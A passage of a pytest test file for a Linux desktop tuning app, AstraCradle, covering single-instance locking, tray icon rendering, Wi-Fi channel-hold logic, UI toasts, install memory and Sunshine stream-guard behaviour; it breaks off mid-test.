"""Tests for v2.5.1: Single-instance enforcement & crisp KDE/X11 tray/desktop icon rendering."""

from __future__ import annotations

import json
import os
from pathlib import Path
import subprocess
import sys
import tempfile
import time

from PIL import Image

from astracradle.core.config import ConfigManager
from astracradle.core.crash_analyzer import CrashAnalyzer
from astracradle.core.journal import ForensicJournal
from astracradle.core.lifecycle import LifecycleManager
from astracradle.core.rollback import RollbackManager
from astracradle.core.scripts_engine import ScriptsEngine
from astracradle.core.executor import GuardedExecutor
from astracradle.core.single_instance import SingleInstanceManager
from astracradle.ui.tray import TrayController, build_net_wm_icon_data, prepare_xorg_tray_image


def test_single_instance_cmdline_classifier() -> None:
    assert SingleInstanceManager.is_gui_cmdline(["/home/u/.venv/bin/astracradle-gui"])
    assert SingleInstanceManager.is_gui_cmdline(["python3", "-m", "astracradle"])
    assert SingleInstanceManager.is_gui_cmdline(["python3", "-m", "astracradle", "--minimized"])
    assert not SingleInstanceManager.is_gui_cmdline(["python3", "-m", "astracradle", "--self-check"])
    assert not SingleInstanceManager.is_gui_cmdline(["python3", "-m", "astracradle", "--mesh-status"])
    assert not SingleInstanceManager.is_gui_cmdline(["python3", "-m", "pytest", "-q"])


def test_single_instance_replaces_existing_process_cleanly() -> None:
    with tempfile.TemporaryDirectory() as tmp:
        cfg_mgr = ConfigManager(base_dir=tmp)
        journal = ForensicJournal(cfg_mgr)

        # Spawn a dummy long-lived child holding instance.lock + heartbeat.json
        child_code = (
            "import json, signal, sys, time\n"
            "from pathlib import Path\n"
            "from astracradle.core.config import ConfigManager\n"
            "from astracradle.core.single_instance import SingleInstanceManager\n"
            "cfg = ConfigManager(base_dir=sys.argv[1])\n"
            "si = SingleInstanceManager(cfg)\n"
            "si.acquire()\n"
            "(cfg.state_dir / 'heartbeat.json').write_text(json.dumps({'clean_shutdown': False, 'ts': time.time()}))\n"
            "running = True\n"
            "def _stop(_s, _f):\n"
            "    global running\n"
            "    running = False\n"
            "signal.signal(signal.SIGTERM, _stop)\n"
            "print('READY', flush=True)\n"
            "while running:\n"
            "    time.sleep(0.05)\n"
            "si.release()\n"
        )
        proc = subprocess.Popen(
            [sys.executable, "-c", child_code, tmp],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )
        try:
            ready_line = proc.stdout.readline().strip() if proc.stdout else ""
            assert ready_line == "READY"

            si_new = SingleInstanceManager(cfg_mgr)
            killed = si_new.terminate_existing_instances(timeout_sec=3.0, include_process_scan=False)
            assert proc.pid in killed
            rc = proc.wait(timeout=3.0)
            assert rc is not None

            # Replacement must mark clean_shutdown=True so CrashAnalyzer does NOT raise a false crash
            report = CrashAnalyzer(cfg_mgr, journal).inspect_on_startup()
            assert report is None

            # Acquire lock for new process and confirm release only deletes own PID lock
            si_new.acquire()
            assert si_new.read_lock_pid() == os.getpid()
            si_new.lock_path.write_text(json.dumps({"pid": 99999999}), encoding="utf-8")
            si_new.release()
            assert si_new.lock_path.exists()
            si_new.acquire()
            si_new.release()
            assert not si_new.lock_path.exists()
        finally:
            if proc.poll() is None:
                proc.kill()
                proc.wait(timeout=2)


def test_tray_xorg_alpha_composite_and_net_wm_icon_payload() -> None:
    emblem = Path(__file__).resolve().parents[1] / "astracradle" / "assets" / "astracradle_emblem_64.png"
    assert emblem.exists()
    with Image.open(emblem) as rgba:
        composited = prepare_xorg_tray_image(rgba, size=(32, 32))
        assert composited.mode == "RGB"
        assert composited.size == (32, 32)
        # Outer transparent corner must match dark panel backdrop (#1E242B), NOT leaked teal/random RGB
        assert composited.getpixel((0, 0)) == (30, 36, 43)
        # Center gold core must remain crisp and distinct from backdrop
        center = composited.getpixel((16, 16))
        assert center[0] > 170 and center[1] > 120

        wm_data = build_net_wm_icon_data(rgba, sizes=(32, 64))
        assert wm_data[0] == 32 and wm_data[1] == 32
        offset_64 = 2 + 32 * 32
        assert wm_data[offset_64] == 64 and wm_data[offset_64 + 1] == 64
        assert len(wm_data) == (2 + 32 * 32) + (2 + 64 * 64)
        # Corner alpha byte in ARGB should be 0
        assert (wm_data[2] >> 24) == 0
        # Center pixel alpha byte in ARGB should be opaque (255)
        center_argb = wm_data[2 + (16 * 32 + 16)]
        assert ((center_argb >> 24) & 0xFF) == 255


def test_linux_shortcuts_install_hicolor_index_theme(monkeypatch) -> None:
    with tempfile.TemporaryDirectory() as tmp:
        fake_home = Path(tmp) / "home"
        fake_home.mkdir()
        monkeypatch.setattr(Path, "home", staticmethod(lambda: fake_home))
        cfg_mgr = ConfigManager(base_dir=Path(tmp) / "cfg")
        journal = ForensicJournal(cfg_mgr)
        rb = RollbackManager(cfg_mgr)
        ex = GuardedExecutor(cfg_mgr, rb, journal)
        sc = ScriptsEngine(cfg_mgr, ex, journal)
        lm = LifecycleManager(cfg_mgr, rb, journal, sc)

        created = lm.install_shortcuts(Path(__file__).resolve().parents[1], os_override="Linux", include_desktop_icon=False)
        assert (fake_home / ".local" / "share" / "icons" / "hicolor" / "index.theme").exists()
        assert (fake_home / ".local" / "share" / "icons" / "hicolor" / "64x64" / "apps" / "astracradle.png").exists()
        desktop_file = fake_home / ".local" / "share" / "applications" / "astracradle.desktop"
        assert desktop_file.exists()
        dtxt = desktop_file.read_text(encoding="utf-8")
        assert "Actions=Open;Diagnose;FixSafe;Quit;" in dtxt
        assert "[Desktop Action Quit]" in dtxt and "--quit" in dtxt
        assert not (fake_home / "Desktop" / "AstraCradle.desktop").exists()
        assert len(created) == 1


def test_tray_controller_xorg_patch_geometry_and_icon_data() -> None:
    from types import SimpleNamespace

    emblem = Path(__file__).resolve().parents[1] / "astracradle" / "assets" / "astracradle_emblem_64.png"
    clicks: list[tuple[int, int]] = []
    tray = TrayController(
        emblem,
        on_show=lambda: None,
        on_scan=lambda: None,
        on_quit=lambda: None,
        on_context_menu=lambda rx, ry: clicks.append((rx, ry)),
    )
    if not tray.available:
        return
    started = tray.start()
    assert started is True
    try:
        time.sleep(0.25)
        icon = tray._icon
        if icon is not None and tray.is_xorg_backend:
            geom = icon._window.get_geometry()
            assert geom.width == 32 and geom.height == 32
            icon._assert_icon_data(32, 32)
            assert icon._icon_data.mode == "RGB"
            assert icon._icon_data.size == (32, 32)
            assert icon._icon_data.getpixel((0, 0)) == (30, 36, 43)
            import Xlib.X

            bp_handler = icon._message_handlers.get(Xlib.X.ButtonPress)
            assert callable(bp_handler)
            bp_handler(SimpleNamespace(detail=3, root_x=420, root_y=1050))
            assert clicks == [(420, 1050)]
    finally:
        tray.stop()


def test_3d_hover_gif_transparency_and_taskbar_boost_animation() -> None:
    from PIL import ImageSequence
    from astracradle.ui.app import AstraCradleApp

    assert not SingleInstanceManager.is_gui_cmdline(["python3", "-m", "astracradle", "--quit"])

    hover_gif = Path(__file__).resolve().parents[1] / "astracradle" / "assets" / "astracradle_hover.gif"
    with Image.open(hover_gif) as gim:
        frames = [fr.convert("RGBA") for fr in ImageSequence.Iterator(gim)]
        assert len(frames) == 48
        assert frames[0].getpixel((0, 0))[3] == 0

    with tempfile.TemporaryDirectory() as td:
        app = AstraCradleApp(base_dir=td, show_startup_popups=False)
        try:
            app.update()
            assert len(app._hover_icon_frames) == 48
            app._start_hover_icon_anim(boost=True)
            assert app._hover_icon_boost is True
            assert app._hover_icon_after_id is not None
            app._stop_hover_icon_anim()
            assert app._hover_icon_boost is False
            assert app._hover_icon_after_id is None
            # Right-click context menu populates Open & Quit entries
            app._show_tray_context_menu(100, 100)
            assert getattr(app, "_tray_ctx_menu", None) is not None
            labels = [
                app._tray_ctx_menu.entrycget(i, "label")
                for i in range(app._tray_ctx_menu.index("end") + 1)
                if app._tray_ctx_menu.type(i) in ("command", "cascade")
            ]
            assert "Open AstraCradle" in labels
            assert "Quit AstraCradle" in labels
            app._tray_ctx_menu.unpost()
        finally:
            app.destroy()


def test_no_font_double_scaling_and_yes_no_dialog_no_clipping() -> None:
    from astracradle.theme import get_palette, get_ui_fonts
    from astracradle.ui.app import AstraCradleApp
    from astracradle.ui.modals import YesNoActionDialog

    with tempfile.TemporaryDirectory() as td:
        app = AstraCradleApp(base_dir=td, show_startup_popups=False)
        try:
            app.update()
            # Fonts must not be double-scaled on top of ctk.set_widget_scaling
            assert app.fonts["body"][1] == get_ui_fonts(1.0)["body"][1]

            dlg = YesNoActionDialog(
                app,
                get_palette("Obsidian Horology"),
                app.fonts,
                "Less-Traffic Wi-Fi Channel Recommended",
                "Switch 'Duffwifi' from 5GHz Ch 157 to 2.4GHz Ch 11 (F6:C1:14:F8:66:7C)?",
                detail_lines=[
                    "Cleanest RF channels right now -> 2.4GHz: ch 11 | 5GHz: ch 44 | 6GHz: ch 1.",
                    "Active link: 'Duffwifi' (F6:C1:14:FF:66:7D) (Signal 52%, Interference 88.0).",
                    "Current BSSID is already on the cleanest available channel for this SSID.",
                ],
            )
            dlg.update()
            assert dlg.winfo_width() >= 540
            assert dlg.winfo_height() >= dlg.winfo_reqheight()
            dlg.destroy()

            # Clicking Benchmark Now on Settings must rebuild cleanly without stacking duplicate Settings pages
            app.switch_nav("settings")
            app._on_capture_benchmark()
            app._on_capture_benchmark()
            app.update()
            assert len(app.pages["settings"].winfo_children()) == 1
        finally:
            app.destroy()


def test_conflict_detector_skips_kernel_threads_and_gpu_reads_amdgpu_hwmon(monkeypatch) -> None:
    from types import SimpleNamespace
    import astracradle.core.pc_extras as pex
    import astracradle.core.advanced_controls as ac_mod

    with tempfile.TemporaryDirectory() as td:
        cfg_mgr = ConfigManager(base_dir=td)
        journal = ForensicJournal(cfg_mgr)

        fake_procs = [
            SimpleNamespace(info={"pid": 143, "ppid": 2, "name": "kworker/u128:1-events_unbound", "cmdline": []}),
            SimpleNamespace(info={"pid": 994, "ppid": 1, "name": "ananicy-cpp", "cmdline": ["/usr/bin/ananicy-cpp", "start"]}),
        ]
        monkeypatch.setattr(pex.psutil, "process_iter", lambda _attrs=None: fake_procs)
        monkeypatch.setattr(pex.shutil, "which", lambda _n: None)
        cd = pex.ConflictProgramDetector(journal)
        conflicts = cd.scan_conflicts()
        ids = [c.conflict_id for c in conflicts]
        assert "unbound" not in ids
        assert "ananicy-cpp" in ids

        # Simulate Linux /sys/class/hwmon with nct6687 + amdgpu
        fake_hwmon = Path(td) / "hwmon"
        hw0 = fake_hwmon / "hwmon0"
        hw1 = fake_hwmon / "hwmon1"
        hw0.mkdir(parents=True)
        hw1.mkdir(parents=True)
        (hw0 / "name").write_text("nct6687\n", encoding="utf-8")
        (hw0 / "pwm1").write_text("128\n", encoding="utf-8")
        (hw1 / "name").write_text("amdgpu\n", encoding="utf-8")
        (hw1 / "pwm1").write_text("77\n", encoding="utf-8")
        (hw1 / "temp1_input").write_text("55000\n", encoding="utf-8")
        (hw1 / "power1_average").write_text("42500000\n", encoding="utf-8")
        (hw1 / "power1_cap").write_text("260000000\n", encoding="utf-8")

        monkeypatch.setattr(ac_mod.shutil, "which", lambda _n: None)
        monkeypatch.setattr(ac_mod.platform, "system", lambda: "Linux")
        orig_path = ac_mod.Path

        def _fake_path(p):
            return fake_hwmon if str(p) == "/sys/class/hwmon" else orig_path(p)

        monkeypatch.setattr(ac_mod, "Path", _fake_path)
        gpu = ac_mod.GpuPowerAndFanController.probe_live_power_and_fan()
        assert gpu["name"] == "amdgpu"
        assert gpu["temp_c"] == "55.0"
        assert gpu["power_draw_w"] == "42.5"
        assert gpu["fan_percent"] == "30"


def test_all_gifs_synced_smooth_loop_and_no_stutter() -> None:
    """Verifies all 3 GIFs match across asset dirs, share timing, wrap smoothly with no stutter, and play in sync."""
    from PIL import ImageChops, ImageSequence
    from astracradle.ui.app import AstraCradleApp
    from astracradle.ui.modals import FloatingMiniOrbWindow
    from astracradle.theme import get_palette

    repo_root = Path(__file__).resolve().parents[1]
    gif_names = ("astracradle_hover.gif", "astracradle_animated.gif", "astracradle_badge_animated.gif")

    for name in gif_names:
        pkg_p = repo_root / "astracradle" / "assets" / name
        root_p = repo_root / "assets" / name
        assert pkg_p.exists() and root_p.exists()
        assert pkg_p.read_bytes() == root_p.read_bytes(), f"{name} out of sync between assets/ and astracradle/assets/"

        with Image.open(pkg_p) as im:
            frames = [fr.convert("RGBA") for fr in ImageSequence.Iterator(im)]
            durs = [int(fr.info.get("duration", im.info.get("duration", 0))) for fr in ImageSequence.Iterator(im)]
            assert len(frames) == 48
            assert set(durs) == {30}
            assert im.info.get("loop", 0) == 0

            # Measure per-pixel mean absolute difference across all consecutive pairs AND the wrap seam (47 -> 0)
            deltas = []
            for i in range(len(frames)):
                a = frames[i].tobytes()
                b = frames[(i + 1) % len(frames)].tobytes()
                mean_diff = sum(abs(x - y) for x, y in zip(a, b)) / float(len(a))
                deltas.append(mean_diff)
            wrap_diff = deltas[-1]
            max_step = max(deltas[:-1])
            assert min(deltas) > 0.25, f"{name} has duplicate/frozen frames causing stutter"
            assert wrap_diff <= max_step * 1.45, f"{name} wrap seam stutter detected ({wrap_diff:.2f} vs {max_step:.2f})"

    # Verify AnimatedGifLabel (sidebar + about) stay locked to same monotonic clock and FloatingMiniOrb updates in-place
    with tempfile.TemporaryDirectory() as td:
        app = AstraCradleApp(base_dir=td, show_startup_popups=False)
        try:
            app.update()
            assert hasattr(app, "sidebar_gif") and hasattr(app, "about_gif")
            idx_s, _ = app.sidebar_gif._frame_for_clock()
            idx_a, _ = app.about_gif._frame_for_clock()
            assert abs(idx_s - idx_a) <= 1

            app.sidebar_gif.set_paused(True)
            assert app.sidebar_gif._after_id is None
            app.sidebar_gif.set_paused(False)
            assert app.sidebar_gif._after_id is not None

            orb = FloatingMiniOrbWindow(
                app,
                get_palette("Obsidian Horology"),
                on_restore=lambda: None,
                gif_path=repo_root / "astracradle" / "assets" / "astracradle_hover.gif",
            )
            img_item_id = orb._img_item
            assert img_item_id is not None
            time.sleep(0.06)
            orb._tick()
            assert orb._img_item == img_item_id  # Updated in place, no canvas delete/recreate stutter
            orb.destroy()
        finally:
            app.destroy()


def test_wifi_permission_auto_select_and_10min_channel_hold() -> None:
    """Verifies permission-gated Wi-Fi auto-channel selection and strict >=10 minute channel hold."""
    from unittest.mock import patch
    from astracradle.core.config import ConfigManager
    from astracradle.core.journal import ForensicJournal
    from astracradle.core.wifi_channel_optimizer import WifiApObservation, WifiChannelOptimizer
    from astracradle.ui.app import AstraCradleApp

    with tempfile.TemporaryDirectory() as td:
        cfg_mgr = ConfigManager(base_dir=td)
        journal = ForensicJournal(cfg_mgr)
        opt = WifiChannelOptimizer(journal=journal, state_dir=Path(td))

        aps_t0 = [
            WifiApObservation(ssid="HomeNet", bssid="AA:BB:CC:DD:EE:01", band="2.4GHz", channel=6, freq_mhz=2437, signal_pct=70, in_use=True),
            WifiApObservation(ssid="Neighbor1", bssid="11:22:33:44:55:01", band="2.4GHz", channel=6, freq_mhz=2437, signal_pct=85, in_use=False),
            WifiApObservation(ssid="HomeNet", bssid="AA:BB:CC:DD:EE:02", band="5GHz", channel=149, freq_mhz=5745, signal_pct=82, in_use=False),
        ]

        t0 = 1_800_000_000.0
        with patch("shutil.which", side_effect=lambda cmd: f"/usr/bin/{cmd}" if cmd in ("nmcli", "iw") else None), \
             patch("subprocess.run") as mrun:
            mrun.return_value.returncode = 0
            mrun.return_value.stdout = ""
            mrun.return_value.stderr = ""

            res1 = opt.optimize_connection(
                dry_run=False,
                prefer_5ghz=True,
                disable_powersave=False,
                aps_override=aps_t0,
                min_hold_sec=600.0,
                now_epoch=t0,
            )
            assert res1.switched is True
            assert res1.best_bssid_channel == 149
            assert res1.hold_active is True
            assert res1.hold_remaining_sec >= 600.0

        # 5 minutes later (300s < 600s), even if Ch 36 looks cleaner than Ch 149, 10m hold must keep Ch 149!
        aps_t5m = [
            WifiApObservation(ssid="HomeNet", bssid="AA:BB:CC:DD:EE:02", band="5GHz", channel=149, freq_mhz=5745, signal_pct=75, in_use=True),
            WifiApObservation(ssid="LoudNeighbor", bssid="11:22:33:44:55:99", band="5GHz", channel=149, freq_mhz=5745, signal_pct=95, in_use=False),
            WifiApObservation(ssid="HomeNet", bssid="AA:BB:CC:DD:EE:03", band="5GHz", channel=36, freq_mhz=5180, signal_pct=88, in_use=False),
        ]
        res_held = opt.optimize_connection(
            dry_run=False,
            prefer_5ghz=True,
            disable_powersave=False,
            aps_override=aps_t5m,
            min_hold_sec=600.0,
            now_epoch=t0 + 300.0,
        )
        assert res_held.hold_active is True
        assert res_held.switched is False
        assert 299.0 <= res_held.hold_remaining_sec <= 301.0

        rec_held = opt.recommend_channels(
            prefer_5ghz=True,
            disable_powersave=False,
            aps_override=aps_t5m,
            min_hold_sec=600.0,
            now_epoch=t0 + 300.0,
        )
        assert rec_held["hold_active"] is True
        assert rec_held["can_roam"] is False

        # After 10+ minutes (605s >= 600s), hold expires and switching to cleaner Ch 36 is permitted again
        with patch("shutil.which", side_effect=lambda cmd: f"/usr/bin/{cmd}" if cmd in ("nmcli", "iw") else None), \
             patch("subprocess.run") as mrun:
            mrun.return_value.returncode = 0
            mrun.return_value.stdout = ""
            mrun.return_value.stderr = ""
            res_expired = opt.optimize_connection(
                dry_run=False,
                prefer_5ghz=True,
                disable_powersave=False,
                aps_override=aps_t5m,
                min_hold_sec=600.0,
                now_epoch=t0 + 605.0,
            )
            assert res_expired.switched is True
            assert res_expired.best_bssid_channel == 36
            assert res_expired.hold_active is True

        # Verify UI Consent wizard permission toggles wifi_prompt_before_apply=False & wifi_min_channel_hold_min>=10
        app = AstraCradleApp(base_dir=td, show_startup_popups=False)
        try:
            assert app.config_obj.consent_wifi_auto_channel is False
            assert app.config_obj.wifi_prompt_before_apply is True
            app._on_toggle_wifi_prompt(False)
            assert app.config_obj.consent_wifi_auto_channel is True
            assert app.config_obj.wifi_prompt_before_apply is False
            assert app.config_obj.wifi_min_channel_hold_min >= 10
        finally:
            app.destroy()


def test_task_progress_and_completion_toasts_for_tv_bluetooth_and_buttons() -> None:
    """Verifies in-progress feedback on task/button start and completion toast on finish (TV/BT scan, Deep Scan, buttons)."""
    import customtkinter as ctk
    from astracradle.ui.app import AstraCradleApp

    with tempfile.TemporaryDirectory() as td:
        app = AstraCradleApp(base_dir=td, show_startup_popups=False)
        try:
            app.update()
            toasts: list[str] = []
            orig_show = app.show_toast

            def _cap_toast(msg: str, color=None, undo_entry_id=None) -> None:
                toasts.append(str(msg))
                orig_show(msg, color=color, undo_entry_id=undo_entry_id)

            app.show_toast = _cap_toast  # type: ignore[method-assign]

            # 1. Explicit TV + Bluetooth scan start -> completion toast
            app.begin_task_progress("lan_tv", "Scanning Wi-Fi/LAN for Smart TVs and Bluetooth devices...")
            assert "lan_tv" in app._active_tasks
            assert "⏳" in app.topbar_status.cget("text")
            assert any("In progress:" in t for t in toasts)

            app._ui_queue.put(("lan_tv_scanned", ["tv1"], ["bt1", "bt2"]))
            app._drain_ui_queue()
            assert "lan_tv" not in app._active_tasks
            assert any("TV & Bluetooth scan complete" in t and "1 Smart TV/LAN" in t and "2 Bluetooth" in t for t in toasts)

            # 2. Deep scan starts in-progress state and completes when scan result arrives
            app.on_deep_scan()
            assert "deep_scan" in app._active_tasks
            assert any("Deep scanning 8 subsystems" in t for t in toasts)

            # 3. Generic CTkButton click shows in-progress feedback & completion toast automatically
            app._active_tasks.clear()
            clicked_flag = {"ran": False}
            b = ctk.CTkButton(app.topbar, text="Test Action", command=lambda: clicked_flag.__setitem__("ran", True))
            b.pack(side="left")
            app.update()

            class _FakeEvt:
                widget = b

            toasts.clear()
            app._on_any_button_press_progress(_FakeEvt())
            assert "⏳ In progress: Test Action" in app.topbar_status.cget("text")
            # Wait for 35ms post-click check
            end_t = time.monotonic() + 0.12
            while time.monotonic() < end_t:
                app.update()
                time.sleep(0.015)
            assert any("✓ Test Action complete" in t for t in toasts)
        finally:
            app.destroy()


def test_persistent_machine_install_memory_and_wifi_mesh_password_toggle() -> None:
    """Verifies persistent machine update memory auto-reapply AND Wi-Fi Mesh password Hide/Show toggle."""
    from unittest.mock import patch
    from astracradle.core.config import ConfigManager
    from astracradle.core.journal import ForensicJournal
    from astracradle.core.lifecycle import LifecycleManager
    from astracradle.core.rollback import RollbackManager
    from astracradle.core.scripts_engine import ScriptsEngine
    from astracradle.core.executor import GuardedExecutor
    from astracradle.core.updater import ModuleAndUpdateManager
    from astracradle.ui.app import AstraCradleApp

    with tempfile.TemporaryDirectory() as td:
        cfg_mgr = ConfigManager(base_dir=td)
        cfg = cfg_mgr.load()
        journal = ForensicJournal(cfg_mgr)
        rb = RollbackManager(cfg_mgr)
        ex = GuardedExecutor(cfg_mgr, rb, journal)
        sc = ScriptsEngine(cfg_mgr, ex, journal)
        lc = LifecycleManager(cfg_mgr, rb, journal, sc)
        upd = ModuleAndUpdateManager(cfg_mgr, journal)

        repo_root = Path(__file__).resolve().parents[1]
        mem = upd.record_install_memory(
            install_dir=repo_root,
            install_method="fish",
            desktop_icon=True,
            shortcuts_installed=True,
            cachyos_fish_wifi_hooks=True,
            shell_links_installed=True,
            step_note="Initial machine setup",
            config=cfg,
        )
        assert upd.install_memory_path.exists()
        assert mem["desktop_icon"] is True
        assert "cachyos_fish_wifi_hooks" in mem["remembered_steps"]

        # Simulate update on the same machine: remembered steps & desktop_icon=True auto-reapply without prompting
        with patch.object(lc, "install_shortcuts", return_value=[Path(td) / "astracradle.desktop"]) as m_short:
            reapplied, mem2 = upd.reapply_remembered_setup(cfg, lc, repo_dir=repo_root)
            m_short.assert_called_once_with(repo_root, include_desktop_icon=True)
            assert any("Desktop Icon: YES" in s for s in reapplied)
            assert len(mem2["update_history"]) >= 2

        # Verify Wi-Fi Mesh password Hide/Show toggle in UI (hidden by default, reveals & masks cleanly)
        app = AstraCradleApp(base_dir=td, show_startup_popups=False)
        try:
            app.switch_nav("wifi")
            app.update()
            assert hasattr(app, "mesh_pass_entry") and hasattr(app, "mesh_pass_toggle_btn")
            assert app.mesh_pass_hidden_var.get() is True
            assert app.mesh_pass_entry.cget("show") == "•"
            assert app.mesh_pass_toggle_btn.cget("text") == "Show"

            app.mesh_pass_var.set("SuperSecretMeshKey99")
            # Build plan while hidden -> plan label masks passphrase
            plan = app.wifi_mesh.build_mesh_plan(
                uplink_input="eth0",
                mesh_ssid="AstraMesh-Array",
                passphrase="SuperSecretMeshKey99",
            )
            app._latest_mesh_plan = plan
            app.mesh_pass_toggle_btn.invoke()
            app.update()
            assert app.mesh_pass_hidden_var.get() is False
            assert app.mesh_pass_entry.cget("show") == ""
            assert app.mesh_pass_toggle_btn.cget("text") == "Hide"
            assert "SuperSecretMeshKey99" in app.mesh_plan_lbl.cget("text")

            # Toggle back to hidden -> masks entry and plan label again
            app.mesh_pass_toggle_btn.invoke()
            app.update()
            assert app.mesh_pass_hidden_var.get() is True
            assert app.mesh_pass_entry.cget("show") == "•"
            assert app.mesh_pass_toggle_btn.cget("text") == "Show"
            assert "SuperSecretMeshKey99" not in app.mesh_plan_lbl.cget("text")
            assert "••••••••••••" in app.mesh_plan_lbl.cget("text")
        finally:
            app.destroy()


def test_self_heal_auto_prune_not_warning_and_autostart_refresh(monkeypatch) -> None:
    import os
    from astracradle.core.executor import GuardedExecutor
    from astracradle.core.lifecycle import LifecycleManager
    from astracradle.core.os_adapters import get_os_adapter
    from astracradle.core.rollback import RollbackManager
    from astracradle.core.scripts_engine import ScriptsEngine
    from astracradle.core.self_heal import SelfHealEngine

    with tempfile.TemporaryDirectory() as td:
        cfg_mgr = ConfigManager(base_dir=td)
        cfg = cfg_mgr.load()
        cfg.quarantine_max_mb = 1
        cfg_mgr.save(cfg)
        journal = ForensicJournal(cfg_mgr)

        # Put a >1 MB dummy item in quarantine so Quarantine & Log Cap Guard auto-prunes it
        q_item = cfg_mgr.quarantine_dir / "old_test_blob.bin"
        q_item.parent.mkdir(parents=True, exist_ok=True)
        q_item.write_bytes(b"X" * (1_200_000))
        os.utime(q_item, (1_000_000, 1_000_000))

        rb = RollbackManager(cfg_mgr)
        ex = GuardedExecutor(cfg_mgr, rb, journal)
        sc = ScriptsEngine(cfg_mgr, ex, journal)
        sh = SelfHealEngine(cfg_mgr, rb, journal)
        results, _audit = sh.run_self_check(get_os_adapter(), cfg)
        q_check = [r for r in results if r.check_name == "Quarantine & Log Cap Guard"][0]
        assert q_check.repaired_automatically is True
        entries = journal.read_entries(limit=25, newest_first=True)
        self_check_entries = [e for e in entries if e.action == "run_self_check"]
        assert self_check_entries and self_check_entries[0].outcome == "repaired"

        # Existing ~/.config/autostart/astracradle.desktop from v1.2.0 must be refreshed to current python path
        fake_home = Path(td) / "home"
        autostart_file = fake_home / ".config" / "autostart" / "astracradle.desktop"
        autostart_file.parent.mkdir(parents=True, exist_ok=True)
        autostart_file.write_text(
            "[Desktop Entry]\nName=AstraCradle\nExec=/old/v1.2.0/.venv/bin/python -m astracradle --minimized\n",
            encoding="utf-8",
        )
        monkeypatch.setattr(Path, "home", lambda: fake_home)
        lc = LifecycleManager(cfg_mgr, rb, journal, sc)
        lc.install_shortcuts(Path(__file__).resolve().parents[1], include_desktop_icon=False)
        updated = autostart_file.read_text(encoding="utf-8")
        assert "/old/v1.2.0/" not in updated
        assert "--minimized" in updated


def test_sunshine_inspect_ignores_47990_astrabeam_collision_and_restart_resets_failed(monkeypatch) -> None:
    from types import SimpleNamespace
    from astracradle.core.astrabeam import SunshineMoonlightBridge

    # Even if AstraBeam is bound on 47990, inspect() checks Sunshine ports 47989/47984 & systemd unit
    monkeypatch.setattr(SunshineMoonlightBridge, "_is_port_open", staticmethod(lambda _h, p, timeout=0.25: p == 47990))
    monkeypatch.setattr("astracradle.core.astrabeam.shutil.which", lambda name: "/usr/bin/sunshine" if name in ("sunshine", "systemctl") else None)
    monkeypatch.setattr(
        "astracradle.core.astrabeam.subprocess.run",
        lambda *a, **kw: SimpleNamespace(returncode=3, stdout="", stderr=""),
    )
    st = SunshineMoonlightBridge.inspect()
    assert st.sunshine_installed is True
    assert st.sunshine_running is False

    calls = []

    def _fake_run(cmd, **_kw):
        calls.append(cmd)
        return SimpleNamespace(returncode=0, stdout="", stderr="")

    monkeypatch.setattr("astracradle.core.astrabeam.subprocess.run", _fake_run)
    ok, msg = SunshineMoonlightBridge.start_or_restart_sunshine()
    assert ok is True
    assert any("reset-failed" in c for c in calls)
    assert any("restart" in c for c in calls)
    assert "47984/47989" in msg


def test_channel_hold_active_suppresses_recommendation_popup(monkeypatch) -> None:
    from astracradle.core.config import ConfigManager
    from astracradle.core.journal import ForensicJournal
    from astracradle.core.wifi_channel_optimizer import WifiApObservation, WifiChannelOptimizer

    with tempfile.TemporaryDirectory() as td:
        cfg_mgr = ConfigManager(base_dir=td)
        journal = ForensicJournal(cfg_mgr)
        opt = WifiChannelOptimizer(journal)
        opt.record_channel_hold("Duffwifi", "F6:C1:14:FF:66:7D", 157, "5GHz", now_epoch=1000.0)

        monkeypatch.setattr(opt, "detect_wifi_interface", lambda: "wlan0")
        monkeypatch.setattr(opt, "_get_active_wifi_connection", lambda _i=None: ("Duffwifi", "F6:C1:14:FF:66:7D"))
        monkeypatch.setattr(opt, "_is_powersave_enabled", lambda _i: True)
        rec = opt.recommend_channels(
            aps_override=[
                WifiApObservation("Duffwifi", "F6:C1:14:FF:66:7D", 157, 5785, "5GHz", 52, 866, True),
                WifiApObservation("Duffwifi", "F6:C1:14:F8:66:7C", 44, 5220, "5GHz", 88, 1200, False),
            ],
            min_hold_sec=600.0,
            now_epoch=1200.0,
        )
        assert rec["hold_active"] is True
        assert rec["has_recommendation"] is False


def test_remote_desktop_stream_guard_suppresses_wifi_changes_and_protects_sunshine(monkeypatch) -> None:
    from types import SimpleNamespace
    from astracradle.core.astrabeam import SunshineMoonlightBridge
    from astracradle.core.config import ConfigManager, DEFAULT_PROTECTED_PROCESSES
    from astracradle.core.journal import ForensicJournal
    from astracradle.core.wifi_channel_optimizer import WifiApObservation, WifiChannelOptimizer

    # Streaming / compositor processes must never be throttled by ProBalance
    low_prot = {p.lower() for p in DEFAULT_PROTECTED_PROCESSES}
    for proc_name in ("sunshine", "moonlight", "tailscaled", "pipewire", "kwin_wayland"):
        assert proc_name in low_prot

    with tempfile.TemporaryDirectory() as td:
        cfg_mgr = ConfigManager(base_dir=td)
        journal = ForensicJournal(cfg_mgr)
        opt = WifiChannelOptimizer(journal)

        # Simulate active Sunshine/Moonlight connection on UDP 47998
        fake_conn = SimpleNamespace(
            laddr=SimpleNamespace(ip="100.77.94.72", port=47998),
            raddr=SimpleNamespace(ip="100.77.94.88", port=51234),
            status="NONE",
        )
        monkeypatch.setattr("psutil.net_connections", lambda kind="inet": [fake_conn])
        active, reason = opt.detect_active_remote_desktop_session()
        assert active is True and "Sunshine/Moonlight" in reason

        # Even with NO active 10m hold, a live remote desktop stream suppresses channel switching & recommendations
        monkeypatch.setattr(opt, "detect_wifi_interface", lambda: "wlan0")
        monkeypatch.setattr(opt, "_get_active_wifi_connection", lambda _i=None: ("Duffwifi", "F6:C1:14:FF:66:7D"))
        monkeypatch.setattr(opt, "_is_powersave_enabled", lambda _i: True)
        aps = [
            WifiApObservation("Duffwifi", "F6:C1:14:FF:66:7D", 157, 5785, "5GHz", 52, 866, True),
            WifiApObservation("Duffwifi", "F6:C1:14:F8:66:7C", 44, 5220, "5GHz", 95, 1200, False),
        ]
        res = opt.optimize_connection(dry_run=False, aps_override=aps)
        assert res.switched is False
        assert "Stream Guard active" in res.action_taken
        rec = opt.recommend_channels(aps_override=aps)
        assert rec["has_recommendation"] is False

        # Verify Sunshine iPad/tablet optimizer picks primary kscreen-doctor output + VA-API
        kscreen_out = (
            "Output: 1 DP-5 uuid\n\tpriority 1\nOutput: 2 DP-4 uuid\n\tpriority 3\nOutput: 3 DP-3 uuid\n\tpriority 2\n"
        )
        monkeypatch.setattr(
